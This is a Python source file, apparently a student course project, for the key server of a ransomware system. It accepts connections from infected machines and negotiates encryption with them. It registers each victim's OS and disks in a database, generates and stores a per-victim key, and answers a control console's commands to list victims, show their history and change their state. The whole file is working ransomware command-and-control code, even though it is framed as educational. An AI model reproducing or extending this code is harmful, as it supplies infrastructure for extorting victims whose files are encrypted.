# --------------------------------------------
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : serveur_cles
# --------------------------------------------
# Importations
# --------------------------------------------
import json
import socket
import threading
import utile.security as security
import queue
import utile.data as udata
import utile.message as message
from utile.network import recv_msg, send_msg
# --------------------------------------------
# Variable global
# --------------------------------------------
print_lock = threading.Lock()
q1 = queue.Queue()
clients = {}
# --------------------------------------------
# Classes
# --------------------------------------------
class server_tcp(object):
    """ Classe de création de serveur_tcp """
    def __init__(self, ip, port, port2):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port
        self.port2 = port2

    def accept_con(self, conn):
        """
        Accepte la connexion
        """
        connexion, addr = conn.accept()
        q1.put(connexion)

    def start_server(self):
        """
        Démarrage du serveur et maintient de celui-ci + gestion des 'commandes'
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            s.bind((self.ip, self.port))
            s2.bind((self.ip, self.port2))
        except socket.error as error:
            print(str(error))
        s.listen(10)
        s2.listen(10)
        while True:
            t1 = threading.Thread(target=self.accept_con, args=(s,))
            t2 = threading.Thread(target=self.accept_con, args=(s2,))
            t1.start()
            t2.start()
            conn = q1.get()
            addr = conn.getpeername()
            clients[addr] = conn
            print(f'[+] {str(addr[0])}:{str(addr[1])}')
            client_thread = threading.Thread(target=self.threaded, args=(conn, addr))
            client_thread.start()
        s.close()
        s2.close()

    def gestion_msg(self, c, msg):
        """
        Système de gestion des commandes envoyées par la console de contrôle
        """
        conn = udata.connect_db()
        msg_type = message.get_message_type(msg)
        if msg == message.list_victim_req():
            listing = udata.list_victims(conn)
            conn.close()
            return str(listing)
        elif "HIST_REQ" in msg:
            return udata.history_req(conn, msg[-3:-2])
        elif msg_type == 'CHANGE_STATE':
            msg = json.loads(msg)
            id_victim = msg['CHGSTATE']
            return udata.change_state(conn, id_victim)
        elif msg_type == "INITIALIZE_REQ":
            if msg is not None:
                msg = json.loads(msg)
                victim = udata.check_hash(conn, msg['INITIALIZE'])
                if victim is None:
                    key_rq = security.gen_key(512)
                    n_victim = udata.insert_victim_new(conn, msg['INITIALIZE'], msg['OS'], msg['DISKS'], str(key_rq))
                    victim = [n_victim, key_rq, 'INITIALIZE']
            return message.get_message('initialize_key', victim)
        elif msg == message.close_connexion():
            return 'Thanks you, good bye.'

    def threaded(self, c, sc):
        """
        Système de création de Threads..
        """
        print('[FiFo] Implemented')
        print('New thread started')
        print('[SecurityLayerAES]Generating Security Parameters...')
        sec_key = security.diffie_hellmand_sendk(c)
        while True:
            data = recv_msg(c, sec_key)
            if data == b'' or data is None:
                print(sc[0] + ':' + str(sc[1]) + ' >> connexion closed.')
                # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                break
            print(str(sc[0] + ':' + str(sc[1]) + " >> " + str(data)))
            rs = self.gestion_msg(c, data)
            send_msg(c, rs, sec_key)
        c.close()
        clients.pop(sc)
